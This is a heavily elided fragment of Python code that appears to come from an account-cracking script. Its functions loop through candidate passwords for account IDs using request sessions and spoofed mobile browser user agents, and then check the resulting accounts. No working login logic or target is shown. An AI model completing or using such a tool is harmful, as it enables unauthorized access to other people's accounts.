...
def crackfree(idf,pwv):
	...
	sys.stdout.flush()
	ua = random.choice(['Mozilla/5.0 (Linux; Android 7.1.1; Nexus 9 Build/N9F27M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.135 Safari/537.36'])
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 7 Build/MOB30X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.53 Safari/537.36'
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/E7FBAF'
			ses = requests.Session()
